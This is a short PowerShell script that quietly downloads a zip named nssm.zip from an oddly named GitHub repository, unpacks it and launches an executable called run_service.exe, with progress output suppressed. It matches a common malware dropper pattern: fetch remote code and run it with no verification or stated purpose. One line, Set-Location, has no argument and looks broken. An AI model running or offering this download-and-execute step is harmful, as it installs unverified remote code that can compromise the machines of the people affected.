$Url = 'https://github.com/37218vuuhuu/app-19/raw/main/nssm.zip'

[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"

$ProgressPreference = 'SilentlyContinue'

Invoke-WebRequest $Url -OutFile nssm.zip

Expand-Archive nssm.zip -DestinationPath nssm
Set-Location
Start "run_service.exe"